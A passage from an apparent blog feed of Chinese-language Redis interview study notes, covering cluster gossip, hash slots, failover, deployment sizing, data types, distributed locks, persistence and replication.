cluster，主要是针对<strong>海量数据+高并发+高可用</strong>的场景。redis cluster 支撑 N 个 redis master node，每个 master node 都可以挂载多个 slave node。这样整个 redis 就可以横向扩容了。如果你要支撑更大数据量的缓存，那就横向扩容更多的 master 节点，每个 master 节点就能存放更多的数据了。</p><h2><span id="面试题剖析">面试题剖析</span></h2><h3><span id="redis-cluster-介绍">redis cluster 介绍</span></h3><ul><li>自动将数据进行分片，每个 master 上放一部分数据</li><li>提供内置的高可用支持，部分 master 不可用时，还是可以继续工作的</li></ul><p>在 redis cluster 架构下，每个 redis 要放开两个端口号，比如一个是 6379，另外一个就是 加1w 的端口号，比如 16379。</p><p>16379 端口号是用来进行节点间通信的，也就是 cluster bus 的东西，cluster bus 的通信，用来进行故障检测、配置更新、故障转移授权。cluster bus 用了另外一种二进制的协议，<code>gossip</code> 协议，用于节点间进行高效的数据交换，占用更少的网络带宽和处理时间。</p><h3><span id="节点间的内部通信机制">节点间的内部通信机制</span></h3><h4><span id="基本通信原理">基本通信原理</span></h4><p>集群元数据的维护有两种方式：集中式、Gossip 协议。redis cluster 节点间采用 gossip 协议进行通信。</p><p><strong>集中式</strong>是将集群元数据（节点信息、故障等等）几种存储在某个节点上。集中式元数据集中存储的一个典型代表，就是大数据领域的 <code>storm</code>。它是分布式的大数据实时计算引擎，是集中式的元数据存储的结构，底层基于 zookeeper（分布式协调的中间件）对所有元数据进行存储维护。</p><p><a href="https://github.com/Disda-coding/advanced-java/blob/master/images/zookeeper-centralized-storage.png" target="_blank" rel="noopener"><img src="https://github.com/Disda-coding/advanced-java/raw/master/images/zookeeper-centralized-storage.png" alt="zookeeper-centralized-storage"></a></p><p>redis 维护集群元数据采用另一个方式， <code>gossip</code> 协议，所有节点都持有一份元数据，不同的节点如果出现了元数据的变更，就不断将元数据发送给其它的节点，让其它节点也进行元数据的变更。</p><p><a href="https://github.com/Disda-coding/advanced-java/blob/master/images/redis-gossip.png" target="_blank" rel="noopener"><img src="https://github.com/Disda-coding/advanced-java/raw/master/images/redis-gossip.png" alt="redis-gossip"></a></p><p><strong>集中式</strong>的<strong>好处</strong>在于，元数据的读取和更新，时效性非常好，一旦元数据出现了变更，就立即更新到集中式的存储中，其它节点读取的时候就可以感知到；<strong>不好</strong>在于，所有的元数据的更新压力全部集中在一个地方，可能会导致元数据的存储有压力。</p><p>gossip 好处在于，元数据的更新比较分散，不是集中在一个地方，更新请求会陆陆续续打到所有节点上去更新，降低了压力；不好在于，元数据的更新有延时，可能导致集群中的一些操作会有一些滞后。</p><ul><li>10000 端口：每个节点都有一个专门用于节点间通信的端口，就是自己提供服务的端口号+10000，比如 7001，那么用于节点间通信的就是 17001 端口。每个节点每隔一段时间都会往另外几个节点发送 <code>ping</code> 消息，同时其它几个节点接收到 <code>ping</code> 之后返回 <code>pong</code>。</li><li>交换的信息：信息包括故障信息，节点的增加和删除，hash slot 信息等等。</li></ul><h4><span id="gossip-协议">gossip 协议</span></h4><p>gossip 协议包含多种消息，包含 <code>ping</code>,<code>pong</code>,<code>meet</code>,<code>fail</code> 等等。</p><ul><li>meet：某个节点发送 meet 给新加入的节点，让新节点加入集群中，然后新节点就会开始与其它节点进行通信。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-trib.rb add-node</span><br></pre></td></tr></table></figure><p>其实内部就是发送了一个 gossip meet 消息给新加入的节点，通知那个节点去加入我们的集群。</p><ul><li>ping：每个节点都会频繁给其它节点发送 ping，其中包含自己的状态还有自己维护的集群元数据，互相通过 ping 交换元数据。</li><li>pong：返回 ping 和 meeet，包含自己的状态和其它信息，也用于信息广播和更新。</li><li>fail：某个节点判断另一个节点 fail 之后，就发送 fail 给其它节点，通知其它节点说，某个节点宕机啦。</li></ul><h4><span id="ping-消息深入">ping 消息深入</span></h4><p>ping 时要携带一些元数据，如果很频繁，可能会加重网络负担。</p><p>每个节点每秒会执行 10 次 ping，每次会选择 5 个最久没有通信的其它节点。当然如果发现某个节点通信延时达到了 <code>cluster_node_timeout / 2</code>，那么立即发送 ping，避免数据交换延时过长，落后的时间太长了。比如说，两个节点之间都 10 分钟没有交换数据了，那么整个集群处于严重的元数据不一致的情况，就会有问题。所以 <code>cluster_node_timeout</code> 可以调节，如果调得比较大，那么会降低 ping 的频率。</p><p>每次 ping，会带上自己节点的信息，还有就是带上 1/10 其它节点的信息，发送出去，进行交换。至少包含 <code>3</code> 个其它节点的信息，最多包含 <code>总节点数减 2</code> 个其它节点的信息。</p><h3><span id="分布式寻址算法">分布式寻址算法</span></h3><ul><li>hash 算法（大量缓存重建）</li><li>一致性 hash 算法（自动缓存迁移）+ 虚拟节点（自动负载均衡）</li><li>redis cluster 的 hash slot 算法</li></ul><h4><span id="hash-算法">hash 算法</span></h4><p>来了一个 key，首先计算 hash 值，然后对节点数取模。然后打在不同的 master 节点上。一旦某一个 master 节点宕机，所有请求过来，都会基于最新的剩余 master 节点数去取模，尝试去取数据。这会导致<strong>大部分的请求过来，全部无法拿到有效的缓存</strong>，导致大量的流量涌入数据库。</p><p><a href="https://github.com/Disda-coding/advanced-java/blob/master/images/hash.png" target="_blank" rel="noopener"><img src="https://github.com/Disda-coding/advanced-java/raw/master/images/hash.png" alt="hash"></a></p><h4><span id="一致性-hash-算法">一致性 hash 算法</span></h4><p>一致性 hash 算法将整个 hash 值空间组织成一个虚拟的圆环，整个空间按顺时针方向组织，下一步将各个 master 节点（使用服务器的 ip 或主机名）进行 hash。这样就能确定每个节点在其哈希环上的位置。</p><p>来了一个 key，首先计算 hash 值，并确定此数据在环上的位置，从此位置沿环<strong>顺时针“行走”</strong>，遇到的第一个 master 节点就是 key 所在位置。</p><p>在一致性哈希算法中，如果一个节点挂了，受影响的数据仅仅是此节点到环空间前一个节点（沿着逆时针方向行走遇到的第一个节点）之间的数据，其它不受影响。增加一个节点也同理。</p><p>燃鹅，一致性哈希算法在节点太少时，容易因为节点分布不均匀而造成<strong>缓存热点</strong>的问题。为了解决这种热点问题，一致性 hash 算法引入了虚拟节点机制，即对每一个节点计算多个 hash，每个计算结果位置都放置一个虚拟节点。这样就实现了数据的均匀分布，负载均衡。</p><p><a href="https://github.com/Disda-coding/advanced-java/blob/master/images/consistent-hashing-algorithm.png" target="_blank" rel="noopener"><img src="https://github.com/Disda-coding/advanced-java/raw/master/images/consistent-hashing-algorithm.png" alt="consistent-hashing-algorithm"></a></p><h4><span id="redis-cluster-的-hash-slot-算法">redis cluster 的 hash slot 算法</span></h4><p>redis cluster 有固定的 <code>16384</code> 个 hash slot，对每个 <code>key</code> 计算 <code>CRC16</code> 值，然后对 <code>16384</code> 取模，可以获取 key 对应的 hash slot。</p><p>redis cluster 中每个 master 都会持有部分 slot，比如有 3 个 master，那么可能每个 master 持有 5000 多个 hash slot。hash slot 让 node 的增加和移除很简单，增加一个 master，就将其他 master 的 hash slot 移动部分过去，减少一个 master，就将它的 hash slot 移动到其他 master 上去。移动 hash slot 的成本是非常低的。客户端的 api，可以对指定的数据，让他们走同一个 hash slot，通过 <code>hash tag</code> 来实现。</p><p>任何一台机器宕机，另外两个节点，不影响的。因为 key 找的是 hash slot，不是机器。</p><p><a href="https://github.com/Disda-coding/advanced-java/blob/master/images/hash-slot.png" target="_blank" rel="noopener"><img src="https://github.com/Disda-coding/advanced-java/raw/master/images/hash-slot.png" alt="hash-slot"></a></p><h3><span id="redis-cluster-的高可用与主备切换原理">redis cluster 的高可用与主备切换原理</span></h3><p>redis cluster 的高可用的原理，几乎跟哨兵是类似的。</p><h4><span id="判断节点宕机">判断节点宕机</span></h4><p>如果一个节点认为另外一个节点宕机，那么就是 <code>pfail</code>，<strong>主观宕机</strong>。如果多个节点都认为另外一个节点宕机了，那么就是 <code>fail</code>，<strong>客观宕机</strong>，跟哨兵的原理几乎一样，sdown，odown。</p><p>在 <code>cluster-node-timeout</code> 内，某个节点一直没有返回 <code>pong</code>，那么就被认为 <code>pfail</code>。</p><p>如果一个节点认为某个节点 <code>pfail</code> 了，那么会在 <code>gossip ping</code> 消息中，<code>ping</code> 给其他节点，如果<strong>超过半数</strong>的节点都认为 <code>pfail</code> 了，那么就会变成 <code>fail</code>。</p><h4><span id="从节点过滤">从节点过滤</span></h4><p>对宕机的 master node，从其所有的 slave node 中，选择一个切换成 master node。</p><p>检查每个 slave node 与 master node 断开连接的时间，如果超过了 <code>cluster-node-timeout * cluster-slave-validity-factor</code>，那么就<strong>没有资格</strong>切换成 <code>master</code>。</p><h4><span id="从节点选举">从节点选举</span></h4><p>每个从节点，都根据自己对 master 复制数据的 offset，来设置一个选举时间，offset 越大（复制数据越多）的从节点，选举时间越靠前，优先进行选举。</p><p>所有的 master node 开始 slave 选举投票，给要进行选举的 slave 进行投票，如果大部分 master node<code>（N/2 + 1）</code>都投票给了某个从节点，那么选举通过，那个从节点可以切换成 master。</p><p>从节点执行主备切换，从节点切换为主节点。</p><h4><span id="与哨兵比较">与哨兵比较</span></h4><p>整个流程跟哨兵相比，非常类似，所以说，redis cluster 功能强大，直接集成了 replication 和 sentinel 的功能。</p><h1><span id="生产环境中的-redis-是怎么部署的">生产环境中的 redis 是怎么部署的？</span></h1><h2><span id="面试官心理分析">面试官心理分析</span></h2><p>看看你了解不了解你们公司的 redis 生产集群的部署架构，如果你不了解，那么确实你就很失职了，你的 redis 是主从架构？集群架构？用了哪种集群方案？有没有做高可用保证？有没有开启持久化机制确保可以进行数据恢复？线上 redis 给几个 G 的内存？设置了哪些参数？压测后你们 redis 集群承载多少 QPS？</p><p>兄弟，这些你必须是门儿清的，否则你确实是没好好思考过。</p><h2><span id="面试题剖析">面试题剖析</span></h2><p>redis cluster，10 台机器，5 台机器部署了 redis 主实例，另外 5 台机器部署了 redis 的从实例，每个主实例挂了一个从实例，5 个节点对外提供读写服务，每个节点的读写高峰qps可能可以达到每秒 5 万，5 台机器最多是 25 万读写请求/s。</p><p>机器是什么配置？32G 内存+ 8 核 CPU + 1T 磁盘，但是分配给 redis 进程的是10g内存，一般线上生产环境，redis 的内存尽量不要超过 10g，超过 10g 可能会有问题。</p><p>5 台机器对外提供读写，一共有 50g 内存。</p><p>因为每个主实例都挂了一个从实例，所以是高可用的，任何一个主实例宕机，都会自动故障迁移，redis 从实例会自动变成主实例继续提供读写服务。</p><p>你往内存里写的是什么数据？每条数据的大小是多少？商品数据，每条数据是 10kb。100 条数据是 1mb，10 万条数据是 1g。常驻内存的是 200 万条商品数据，占用内存是 20g，仅仅不到总内存的 50%。目前高峰期每秒就是 3500 左右的请求量。</p><p>其实大型的公司，会有基础架构的 team 负责缓存集群的运维。</p>]]></content>
      
      
      <categories>
          
          <category> 面试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redis基础知识点</title>
      <link href="/2020/03/25/redis/"/>
      <url>/2020/03/25/redis/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>盘点了常考的Redis基础知识点</p><a id="more"></a><!-- toc --><ul><li><a href="#缓存中间件memcache和redis的区别">缓存中间件——Memcache和Redis的区别 √</a><ul><li><a href="#memcache代码层次类似hash">Memcache：代码层次类似Hash</a></li><li><a href="#redis">Redis</a></li></ul></li><li><a href="#为什么redis能那么快">为什么Redis能那么快 √</a><ul><li><a href="#100000qpsqps即query-per-second每秒查询次数">100000+QPS（QPS即query per second，每秒查询次数）</a></li><li><a href="#多路io复用模型">多路I/O复用模型</a><ul><li><a href="#fdfile-descriptor文件描述符">FD：File Descriptor，文件描述符</a></li><li><a href="#传统的阻塞io模型">传统的阻塞I/O模型</a></li><li><a href="#select系统调用">Select系统调用</a></li><li><a href="#redis采用的io多路复用函数epollkqueueevportselect">Redis采用的I/O多路复用函数：epoll/kqueue/evport/select</a></li></ul></li></ul></li><li><a href="#redis数据类型">Redis数据类型：√</a><ul><li><a href="#供用户使用的数据类型">供用户使用的数据类型</a></li><li><a href="#底层数据类型基础了解">底层数据类型基础（了解）</a></li></ul></li><li><a href="#从海量数据里查询某一固定前缀的key">从海量数据里查询某一固定前缀的key √</a><ul><li><a href="#使用keys对线上的业务的影响">使用keys对线上的业务的影响 √</a><ul><li><a href="#keys-pattern查找所有符合给定模式pattern的key">KEYS pattern：查找所有符合给定模式pattern的key</a></li></ul></li><li><a href="#从海量key里查询出某一固定前缀的key">从海量Key里查询出某一固定前缀的Key √</a></li></ul></li><li><a href="#如何通过redis实现分布式锁">如何通过Redis实现分布式锁</a><ul><li><a href="#分布式锁需要解决的问题">分布式锁需要解决的问题 ×</a></li><li><a href="#setnx-key-value-如果key不存在则创建并赋值">SETNX key value: 如果key不存在，则创建并赋值 √</a></li><li><a href="#set-key-value-ex-seconds-px-milliseconds-nxxx">SET key value [EX seconds] [PX milliseconds] [NX|XX] √</a></li><li><a href="#大量key同时过期的注意事项">大量key同时过期的注意事项</a><ul><li><a href="#集中过期由于清除大量key很耗时会出现短暂卡顿现象">集中过期，由于清除大量key很耗时，会出现短暂卡顿现象 √</a></li></ul></li><li><a href="#使用list作为队列rpush生产消息lpop消费消息">使用List作为队列，RPUSH生产消息，LPOP消费消息 √</a></li><li><a href="#blpop-key-key-timeout-阻塞直到队列有消息或者超时">BLPOP key [key …] timeout: 阻塞直到队列有消息或者超时 √</a></li><li><a href="#pubsub-主题订阅者模式">pub/sub: 主题订阅者模式 √</a><ul><li><a href="#pubsub的缺点">pub/sub的缺点 √</a></li></ul></li></ul></li><li><a href="#redis如何持久化">Redis如何持久化</a><ul><li><a href="#rdb快照持久化保存某个时间点的全量数据快照">Rdb（快照）持久化：保存某个时间点的全量数据快照</a><ul><li><a href="#rdb快照持久化保存某个时间点的全量数据快照">RDB（快照）持久化：保存某个时间点的全量数据快照</a></li><li><a href="#自动化触发rdb持久化的方式">自动化触发RDB持久化的方式 ×</a></li><li><a href="#copy-on-write">Copy-on-Write</a></li><li><a href="#rdb持久化的缺点">RDB持久化的缺点 √</a></li></ul></li><li><a href="#aofappend-only-file持久化保持写状态">AOF（Append-Only-File）持久化：保持写状态</a><ul><li><a href="#日志重写解决aof文件大小不断增大的问题原理如下-">日志重写解决AOF文件大小不断增大的问题，原理如下 -</a></li></ul></li><li><a href="#redis数据的恢复">Redis数据的恢复</a><ul><li><a href="#rdb和aof文件共存情况下的恢复流程">RDB和AOF文件共存情况下的恢复流程 √</a></li><li><a href="#rdb和aof的优缺点">RDB和AOF的优缺点 √</a></li><li><a href="#rdb-aof混合持久化的方式-">RDB-AOF混合持久化的方式 -</a><ul><li><a href="#数据备份">数据备份</a></li><li><a href="#数据恢复">数据恢复</a></li></ul></li><li><a href="#使用pipline的好处-">使用Pipline的好处 -</a></li></ul></li><li><a href="#redis的同步机制">Redis的同步机制</a><ul><li><a href="#主从同步原理">主从同步原理</a><ul><li><a href="#全同步流程">全同步流程：</a></li><li><a href="#增量同步过程">增量同步过程</a></li></ul></li><li><a href="#哨兵同步redis-sentinel">哨兵同步Redis Sentinel</a><ul><li><a href="#流言协议gossip">流言协议Gossip</a></li></ul></li></ul></li></ul></li><li><a href="#redis的集群原理">Redis的集群原理</a></li><li><a href="#集群可用性">集群可用性</a><ul><li><a href="#如何从海量数据里快速找到所需">如何从海量数据里快速找到所需？</a></li><li><a href="#一致性哈希算法对232取模将哈希值空间组织成虚拟的圆环">一致性哈希算法：对2^32取模，将哈希值空间组织成虚拟的圆环</a></li><li><a href="#将数据key使用相同的函数hash计算出哈希值">将数据key使用相同的函数Hash计算出哈希值</a></li><li><a href="#新增服务器node-x">新增服务器Node X</a></li><li><a href="#hash环的数据倾斜问题">Hash环的数据倾斜问题</a></li><li><a href="#引入虚拟节点解决数据倾斜的问题">引入虚拟节点解决数据倾斜的问题</a></li></ul></li></ul><!-- tocstop --><p><img src="image-20200325150748001.png" alt></p><h2><span id="缓存中间件memcache和redis的区别">缓存中间件——Memcache和Redis的区别 √</span></h2><h3><span id="memcache代码层次类似hash">Memcache：代码层次类似Hash</span></h3><p>Ø 支持简单数据类型</p><p>Ø 不支持数据持久化存储</p><p>Ø 不支持主从</p><p>Ø 不支持分片</p><h3><span id="redis">Redis</span></h3><p>Ø 数据类型丰富</p><p>Ø 支持数据磁盘持久化存储</p><p>Ø 支持主从</p><p>Ø 支持分片</p><h2><span id="为什么redis能那么快">为什么Redis能那么快 √</span></h2><h3><span id="100000qpsqps即query-per-second每秒查询次数">100000+QPS（QPS即query per second，每秒查询次数）</span></h3><p>Ø 完全基于内存，绝大部分请求是纯粹的内存操作，执行效率高</p><p>Ø 数据结构简单，对数据操作也简单</p><p>Ø 采用单线程，不会有上下文切换开销，不用去考虑各种锁的问题，不存在加锁释放锁操作，没有因为可能出现死锁而导致的性能消耗；</p><p>Ø 使用多路I/O复用模型，非阻塞IO</p><h3><span id="多路io复用模型">多路I/O复用模型</span></h3><h4><span id="fdfile-descriptor文件描述符">FD：File Descriptor，文件描述符</span></h4><p>一个打开的文件通过唯一的描述符进行引用，该描述符是打开文件的元数据到文件本身的映射 </p><h4><span id="传统的阻塞io模型">传统的阻塞I/O模型</span></h4><p>   <img src="image-20200325150854778.png" alt="BIO"></p><h4><span id="select系统调用">Select系统调用</span></h4><p> <img src="image-20200325150908349.png" alt></p><p>Selector同时监控多个FD的可读可写情况，返回可读可写FD个数 </p><p>可达到在<font color="red">同一个线程内同时处理多个I/O请求的目的</font>。而在同步阻塞模型中，必须通过多线程的方式才能达到这个目的。</p><h4><span id="redis采用的io多路复用函数epollkqueueevportselect">Redis采用的I/O多路复用函数：epoll/kqueue/evport/select</span></h4><p>Ø 因地制宜</p><p>Ø 优先选择时间复杂度为O(1)的I/O多路复用函数作为底层实现</p><p>Ø 以时间复杂度为O(n)的select作为保底</p><p>Ø请求/响应模型监听I/O事件</p><h2><span id="redis数据类型">Redis数据类型：√</span></h2><h3><span id="供用户使用的数据类型">供用户使用的数据类型</span></h3><p>Ø String：最基本的数据类型，二进制安全 </p><p><strong>二进制指的是可以是图片或者序列化对象，等等二进制表示的文件，最多512M。</strong></p><p>Ø Hash：String元素组成的字典，适合用于存储对象</p><p>Ø List：列表，按照String元素插入顺序排序</p><p><strong>List是Stack结构的 先入后出</strong> </p><p>Ø Set：String元素组成的无序集合，通过哈希表实现，不允许重复（整数集合或字典）</p><p>Ø Sorted Set：通过分数来为集合中的成员进行从小到大的排序 (压缩列表或跳表)</p><p><strong>分数重复 值不同没有问题</strong></p><h3><span id="底层数据类型基础了解">底层数据类型基础（了解）</span></h3><ol><li><p>简单动态字符串</p></li><li><p>链表</p></li><li><p>字典</p></li><li><p>跳跃表</p></li><li><p>整数集合</p></li><li><p>压缩列表</p></li><li><p>对象</p></li></ol><h2><span id="从海量数据里查询某一固定前缀的key">从海量数据里查询某一固定前缀的key √</span></h2><p><strong>留意细节</strong></p><p>Ø 摸清数据规模，即问清楚边界</p><h3><span id="使用keys对线上的业务的影响">使用keys对线上的业务的影响 √</span></h3><h4><span id="keys-pattern查找所有符合给定模式pattern的key">KEYS pattern：查找所有符合给定模式pattern的key</span></h4><p>Ø KEYS指令一次性返回所有匹配的key</p><p>Ø 键的数量过大会使服务卡顿</p><h3><span id="从海量key里查询出某一固定前缀的key">从海量Key里查询出某一固定前缀的Key √</span></h3><p><strong>SCAN cursor [MATCH pattern] [COUNT count]</strong></p><p>Ø 基于游标的迭代器，需要基于上一次的游标延续之前的迭代过程</p><p>Ø 以0作为游标开始一次新的迭代，直到命令返回游标0完成一次遍历</p><p>Ø 不保证每次执行都返回某个给定数量的元素，支持模糊查询</p><p>Ø 一次返回的数量不可控，只能是大概率符合count参数</p><p> <img src="image-20200325153817291.png" alt></p><p><strong>第一个返回值是游标，第二个返回值是结果集，虽然写count=10但是不一定返回10个</strong></p><p> <img src="image-20200325153826137.png" alt></p><p><strong>Cursor</strong>并不一定是递增的，可能比前一次还小，可能会获取重复key</p><h2><span id="如何通过redis实现分布式锁">如何通过Redis实现分布式锁</span></h2><h3><span id="分布式锁需要解决的问题">分布式锁需要解决的问题 ×</span></h3><p>Ø 互斥性</p><p>Ø 安全性</p><p>Ø 死锁</p><p>Ø 容错</p><h3><span id="setnx-key-value-如果key不存在则创建并赋值">SETNX key value: 如果key不存在，则创建并赋值 √</span></h3><p>Ø 时间复杂度：O(1)</p><p>Ø 返回值：设置成功，返回1；设置失败，返回0。</p><p><img src="image-20200325154323739.png" alt></p><p>因此我们可以通过该命令来实现锁，但是由于setnx长期存在，我们还需要设置过期的时间。 </p><p><strong>EXPIRE key seconds</strong></p><p>设置key的生存时间，当key过期时（生存时间为0），会被自动删除</p><p><img src="image-20200325154427112.png" alt></p><p><img src="image-20200325154432805.png" alt></p><p>但是还是有风险，如果执行设置成功后，来不及设置expire就挂掉</p><p>违背了操作原子性的初衷</p><p>解决方案：</p><h3><span id="set-key-value-ex-seconds-px-milliseconds-nxxx">SET key value [EX seconds] [PX milliseconds] [NX|XX] √</span></h3><p>Ø EX second: 设置键的过期时间为second秒</p><p>Ø PX millisecond： 设置键的过期时间为millisecond毫秒</p><p>Ø NX：只在键不存在时，才对键进行设置操作</p><p>Ø XX：只在键已经存在时，才对键进行设置操作</p><p>Ø Set操作成功完成时，返回OK，否则返回nil</p><p><img src="image-20200325154604297.png" alt></p><p><img src="image-20200325154627847.png" alt></p><h3><span id="大量key同时过期的注意事项">大量key同时过期的注意事项</span></h3><h4><span id="集中过期由于清除大量key很耗时会出现短暂卡顿现象">集中过期，由于清除大量key很耗时，会出现短暂卡顿现象 √</span></h4><p>Ø 解决方案：在设置key的过期时间的时候，给每个key加上随机值</p><h3><span id="使用list作为队列rpush生产消息lpop消费消息">使用List作为队列，RPUSH生产消息，LPOP消费消息 √</span></h3><p>Ø 缺点：没有等待队列里有值就直接消费</p><p>Ø 弥补：可以通过在应用层引入Sleep机制去调用LPOP重试</p><p> <img src="image-20200325154827138.png" alt></p><p>如果不用Sleep呢？</p><h3><span id="blpop-key-key-timeout-阻塞直到队列有消息或者超时">BLPOP key [key …] timeout: 阻塞直到队列有消息或者超时 √</span></h3><p>Ø 缺点：只能供一个消费者消费</p><p><img src="image-20200325154926990.png" alt></p><h3><span id="pubsub-主题订阅者模式">pub/sub: 主题订阅者模式 √</span></h3><p>Ø 发送者（pub）发送消息，订阅者（sub）接收消息</p><p>Ø 订阅者可以订阅任意数量的频道</p><p><img src="image-20200325160641778.png" alt></p><p><img src="image-20200325160722559.png" alt></p><h4><span id="pubsub的缺点">pub/sub的缺点 √</span></h4><p>消息的发布是无状态的，无法保证可达</p><h2><span id="redis如何持久化">Redis如何持久化</span></h2><h3><span id="rdb快照持久化保存某个时间点的全量数据快照">Rdb（快照）持久化：保存某个时间点的全量数据快照</span></h3><p><img src="image-20200325160753346.png" alt></p><p>如果900s 内有1条修改就保存</p><p>如下同理</p><p><img src="image-20200325160804011.png" alt></p><p>当备份进程出错，主进程停止写入操作</p><p><img src="image-20200325160815627.png" alt></p><p>尽量不开启，因为redis是cpu密集型的，开启增加cpu消耗</p><p><strong>关闭rdb的命令：</strong>config set save “”</p><p>或者在配置文件中save都注释掉后再加上 save “”就禁用了rdb方式</p><h4><span id="rdb快照持久化保存某个时间点的全量数据快照">RDB（快照）持久化：保存某个时间点的全量数据快照</span></h4><p>Ø SAVE：阻塞Redis的服务器进程，直到RDB文件被创建完毕</p><p>Ø BGSAVE：Fork出一个子进程来创建RDB文件，不阻塞服务器进程</p><p><img src="image-20200325160856961.png" alt></p><p>上次执行save指令的时间</p><p><img src="image-20200325160907700.png" alt></p><h4><span id="自动化触发rdb持久化的方式">自动化触发RDB持久化的方式 ×</span></h4><p>Ø 根据redis.conf配置里的SAVE m n定时触发（用的是BGSAVE）</p><p>Ø 主从复制时，主节点自动触发</p><p>Ø 执行Debug Reload</p><p>Ø 执行Shutdown且没有开启AOF持久化</p><p><img src="image-20200325161010058.png" alt></p><h4><span id="copy-on-write">Copy-on-Write</span></h4><ul><li>系统调用fork（）：创建进程，实现了Copy-on-Write </li></ul><p>如果有多个调用者同时要求相同资源（如内存或磁盘上的数据存储），他们会共同获取相同的指针指向相同的资源，直到某个调用者试图修改资源的内容时，系统才会真正复制一份专用副本给该调用者，而其他调用者所见到的最初的资源仍然保持不变。</p><p><img src="image-20200325161054664.png" alt></p><h4><span id="rdb持久化的缺点">RDB持久化的缺点 √</span></h4><p>Ø 内存数据的全量同步，数据量大会由于I/O而严重影响性能</p><p>Ø 可能会因为Redis挂掉而丢失从当前至最近一次快照期间的数据</p><h3><span id="aofappend-only-file持久化保持写状态">AOF（Append-Only-File）持久化：保持写状态</span></h3><p>Ø 记录下除了查询以外的所有变更数据库状态的指令</p><p>Ø 以append的形式追加保存到AOF文件中（增量） </p><p>默认关闭，修改redis.conf</p><p><img src="image-20200325161330713.png" alt></p><p>改成yes</p><p><img src="image-20200325161341662.png" alt></p><p>然后在redis client里面输入config set appendonly yes使其生效</p><p><img src="image-20200325161651580.png" alt></p><p>fork子线程将内存里面的数据更改转换成对应指令然后同时也记录新的变动到原aof。</p><h4><span id="日志重写解决aof文件大小不断增大的问题原理如下-">日志重写解决AOF文件大小不断增大的问题，原理如下 -</span></h4><p>Ø 调用fork(), 创建一个子进程</p><p>Ø 子进程把新的AOF写到一个临时文件里，不依赖原来的AOF文件</p><p>Ø 主进程持续将新的变动同时写到内存和原来的AOF里</p><p>Ø 主进程获取子进程重写AOF的完成信号，往新AOF同步增量变动</p><p>Ø 使用新的AOF文件替换掉旧的AOF文件</p><p>redis在载入AOF文件的时候，会创建一个虚拟的client，把AOF中每一条命令都执行一遍，最终还原回数据库的状态，它的载入也是自动的。在RDB和AOF备份文件都有的情况下，redis会优先载入AOF备份文件</p><p>AOF文件可能会随着服务器运行的时间越来越大，可以利用AOF重写的功能，来控制AOF文件的大小。AOF重写功能会首先读取数据库中现有的键值对状态，然后根据类型使用一条命令来替代前的键值对多条命令。</p><h3><span id="redis数据的恢复">Redis数据的恢复</span></h3><h4><span id="rdb和aof文件共存情况下的恢复流程">RDB和AOF文件共存情况下的恢复流程 √</span></h4><p><img src="image-20200325161951548.png" alt></p><p>有AOF就用AOF没有就用RDB</p><h4><span id="rdb和aof的优缺点">RDB和AOF的优缺点 √</span></h4><p>Ø RDB优点:全量数据快照,文件小,恢复快</p><p>Ø RDB缺点:无法保存最近一次快照后的数据</p><p>Ø AOF优点:可读性高,适合保存增量数据,数据不易丢失</p><p>Ø AOF缺点:文件体积大,恢复时间长</p><h4><span id="rdb-aof混合持久化的方式-">RDB-AOF混合持久化的方式 -</span></h4><p><img src="image-20200325162349761.png" alt></p><h5><span id="数据备份">数据备份</span></h5><p>Ø 先使用RDB全量持久化,AOF做增量持久化</p><p>Ø AOF文件的前半段是RDB格式的全量数据后半段是redis命令格式的增量数据</p><h5><span id="数据恢复">数据恢复</span></h5><p>当我们开启了混合持久化时，启动redis依然优先加载aof文件，aof文件加载可能有两种情况如下：</p><p>aof文件开头是rdb的格式, 先加载 rdb内容再加载剩余的 aof。</p><p>aof文件开头不是rdb的格式，直接以aof格式加载整个文件。</p><h4><span id="使用pipline的好处-">使用Pipline的好处  -</span></h4><p>Ø Pipeline和Linux的管道类似</p><p>Ø Redis基于请求/响应模型，单个请求处理需要一一应答</p><p>Ø Pipeline批量执行指令，节省多次IO往返的时间</p><p>Ø 有顺序依赖的指令建议分批发送</p><h3><span id="redis的同步机制">Redis的同步机制</span></h3><p>Ø 主从</p><p>Ø 哨兵</p><p>Ø 集群</p><h4><span id="主从同步原理">主从同步原理</span></h4><p>Master节点用于写操作</p><p>Slaver节点用于读操作</p><p><img src="image-20200325162444666.png" alt></p><p>定期备份工作也是单独选择一个slaver实现的，</p><h5><span id="全同步流程">全同步流程：</span></h5><p>Ø Salver发送sync命令到Master</p><p>Ø Master启动一个后台进程，将Redis中的数据快照保存到文件中</p><p>Ø Master将保存数据快照期间接收到的写命令缓存起来</p><p>Ø Master在完成写文件操作后，将该文件发送给Salver</p><p>Ø 使用新的AOF文件替换掉旧的AOF文件</p><p>Ø Master将这期间收集的增量写命令发送给Salver端</p><h5><span id="增量同步过程">增量同步过程</span></h5><p>Ø Master接收到用户的操作指令，判断是否需要传播到Slave</p><p>Ø 将操作记录追加到AOF文件</p><p>Ø 将操作传播到其他Slave：1、对齐主从库；2、往响应缓存写入指令</p><p>Ø 将缓存中的数据发送给Slave</p><p>弊端是，不具备高可用性。当Master节点挂掉后，redis将无法提供写入服务</p><h4><span id="哨兵同步redis-sentinel">哨兵同步Redis Sentinel</span></h4><p><strong>解决主从同步Master宕机后的主从切换问题：</strong></p><p>Ø 监控：检查主从服务器是否运行正常</p><p>Ø 提醒：通过API向管理员或者其他应用程序发送故障通知</p><p>Ø 自动故障迁移：主从切换</p><p>投票决定是否故障迁移，和谁作为新的主服务器</p><p>流言协议接收主服务器是否下线的信息</p><h5><span id="流言协议gossip">流言协议Gossip</span></h5><p><strong>在杂乱无章中寻求一致</strong></p><p>Ø 每个节点都随机地和对方通信，最终所有节点的状态达成一致</p><p>Ø 种子节点定期随机向其他节点发送节点列表以及需要传播的消息</p><p>Ø 不保证信息一定会传递给所有节点，但是最终会趋于一致</p><p>Redis 集群是去中心化的，彼此之间状态同步靠 gossip 协议通信，集群的消息有以下几种类型：</p><ul><li><strong>Meet</strong> 通过「cluster meet ip port」命令，已有集群的节点会向新的节点发送邀请，加入现有集群。</li><li><strong>Ping</strong> 节点每秒会向集群中其他节点发送 ping 消息，消息中带有自己已知的两个节点的地址、槽、状态信息、最后一次通信时间等。</li><li><strong>Pong</strong> 节点收到 ping 消息后会回复 pong 